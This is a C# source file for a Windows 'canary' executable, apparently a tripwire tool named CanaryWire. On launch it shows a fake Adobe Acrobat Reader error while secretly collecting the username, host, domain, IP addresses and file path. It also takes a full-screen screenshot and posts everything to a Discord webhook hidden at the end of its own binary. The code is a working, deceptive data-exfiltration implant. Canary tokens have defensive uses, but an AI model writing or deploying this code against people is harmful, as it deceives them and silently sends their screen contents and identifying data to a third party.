using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

namespace CanaryWire.Canary
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            string? webhookUrl = ExtractWebhookUrl();

            Task? alertTask = null;
            if (!string.IsNullOrEmpty(webhookUrl))
            {
                alertTask = RunPayload(webhookUrl);
            }

            Application.SetHighDpiMode(HighDpiMode.SystemAware);
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            
            MessageBox.Show(
                "There was an error opening this document. The file is damaged and could not be repaired.", 
                "Adobe Acrobat Reader", 
                MessageBoxButtons.OK, 
                MessageBoxIcon.Error);
                
            if (alertTask != null)
            {
                try { alertTask.Wait(TimeSpan.FromSeconds(15)); } catch { }
            }
        }

        static string? ExtractWebhookUrl()
        {
            try 
            {
                string? path = Process.GetCurrentProcess().MainModule?.FileName;
                if (path == null) return null;
                
                using (var fs = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    if (fs.Length < 4) return null; 

                    fs.Seek(-4, SeekOrigin.End);
                    byte[] lengthBytes = new byte[4];
                    fs.ReadExactly(lengthBytes, 0, 4);
                    int urlLength = BitConverter.ToInt32(lengthBytes, 0);

                    if (urlLength <= 0 || urlLength > 2000) return null; 
                    if (fs.Length < 4 + urlLength) return null;

                    fs.Seek(-(4 + urlLength), SeekOrigin.End);
                    byte[] urlBytes = new byte[urlLength];
                    fs.ReadExactly(urlBytes, 0, urlLength);
                    
                    return Encoding.UTF8.GetString(urlBytes);
                }
            }
            catch 
            {
                return null;
            }
        }

        static string GetWindowsVersion()
        {
            try
            {
                string productName = "Windows";
                string displayVersion = "";
                string buildStr = "";

                using (var key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion"))
                {
                    if (key != null)
                    {
                        productName = key.GetValue("ProductName")?.ToString() ?? productName;
                        displayVersion = key.GetValue("DisplayVersion")?.ToString() ?? "";
                        int build = Environment.OSVersion.Version.Build;
                        buildStr = build.ToString();

                        // Windows 11 has build >= 22000 but registry may still say "Windows 10"
                        if (build >= 22000 && productName.Contains("Windows 10"))
                        {
                            productName = productName.Replace("Windows 10", "Windows 11");
                        }
                    }
                }

                string result = productName;
                if (!string.IsNullOrEmpty(displayVersion))
                    result += " " + displayVersion;
                if (!string.IsNullOrEmpty(buildStr))
                    result += " (Build " + buildStr + ")";

                return result;
            }
            catch
            {
                return Environment.OSVersion.ToString();
            }
        }

        static byte[]? CaptureScreen()
        {
            try
            {
                var bounds = Screen.PrimaryScreen?.Bounds;
                if (bounds == null || bounds.Value.Width == 0) return null;

                using (var bmp = new Bitmap(bounds.Value.Width, bounds.Value.Height, PixelFormat.Format32bppArgb))
                using (var gfx = Graphics.FromImage(bmp))
                {
                    gfx.CopyFromScreen(bounds.Value.Location, Point.Empty, bounds.Value.Size, CopyPixelOperation.SourceCopy);

                    using (var ms = new MemoryStream())
                    {
                        bmp.Save(ms, ImageFormat.Png);
                        return ms.ToArray();
                    }
                }
            }
            catch
            {
                return null;
            }
        }

        static async Task RunPayload(string webhookUrl)
        {
            try
            {
                string user = Environment.UserName;
                string pcName = Environment.MachineName;
                string domain = Environment.UserDomainName;
                string os = GetWindowsVersion();
                string cpuCores = Environment.ProcessorCount.ToString();
                string publicIp = "Unknown";
                string localIp = "Unknown";
                string canaryPath = "Unknown";

                byte[]? screenshot = CaptureScreen();

                try
                {
                    canaryPath = Process.GetCurrentProcess().MainModule?.FileName ?? "Unknown";
                }
                catch { }

                try
                {
                    localIp = string.Join(", ",
                        NetworkInterface.GetAllNetworkInterfaces()
                            .Where(n => n.OperationalStatus == OperationalStatus.Up && n.NetworkInterfaceType != NetworkInterfaceType.Loopback)
                            .SelectMany(n => n.GetIPProperties().UnicastAddresses)
                            .Where(a => a.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                            .Select(a => a.Address.ToString()));
                    if (string.IsNullOrEmpty(localIp)) localIp = "Unknown";
                }
                catch { }
                
                try
                {
                    using (HttpClient client = new HttpClient())
                    {
                        client.Timeout = TimeSpan.FromSeconds(5);
                        publicIp = (await client.GetStringAsync("https://api.ipify.org")).Trim();
                    }
                }
                catch { }

                string timestamp = DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss") + " UTC";

                // Discord embed for clean formatting
                string embedJson =
                    "{" +
                    "\"embeds\":[{" +
                    "\"title\":\"CANARY TRIGGERED\"," +
                    "\"color\":16711680," +
                    "\"fields\":[" +
                    "{\"name\":\"User\",\"value\":\"" + EscapeJson(user) + "\",\"inline\":true}," +
                    "{\"name\":\"Host\",\"value\":\"" + EscapeJson(pcName) + "\",\"inline\":true}," +
                    "{\"name\":\"Domain\",\"value\":\"" + EscapeJson(domain) + "\",\"inline\":true}," +
                    "{\"name\":\"OS\",\"value\":\"" + EscapeJson(os) + "\",\"inline\":false}," +
                    "{\"name\":\"CPU Cores\",\"value\":\"" + EscapeJson(cpuCores) + "\",\"inline\":true}," +
                    "{\"name\":\"Public IP\",\"value\":\"" + EscapeJson(publicIp) + "\",\"inline\":true}," +
                    "{\"name\":\"Local IP\",\"value\":\"" + EscapeJson(localIp) + "\",\"inline\":false}," +
                    "{\"name\":\"File Path\",\"value\":\"``" + EscapeJson(canaryPath) + "``\",\"inline\":false}," +
                    "{\"name\":\"Time (UTC)\",\"value\":\"" + EscapeJson(timestamp) + "\",\"inline\":false}" +
                    "]," +
                    (screenshot != null ? "\"image\":{\"url\":\"attachment://screen.png\"}," : "") +
                    "\"footer\":{\"text\":\"CanaryWire\"}" +
                    "}]" +
                    "}";

                using (HttpClient client = new HttpClient())
                {
                    if (screenshot != null)
                    {
                        // Multipart: embed JSON + screenshot attachment
                        using (var form = new MultipartFormDataContent())
                        {
                            form.Add(new StringContent(embedJson, Encoding.UTF8, "application/json"), "payload_json");
                            form.Add(new ByteArrayContent(screenshot), "files[0]", "screen.png");
                            await client.PostAsync(webhookUrl, form);
                        }
                    }
                    else
                    {
                        var content = new StringContent(embedJson, Encoding.UTF8, "application/json");
                        await client.PostAsync(webhookUrl, content);
                    }
                }
            }
            catch { }
        }

        static string EscapeJson(string s)
        {
            if (s == null) return "";
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "");
        }
    }
}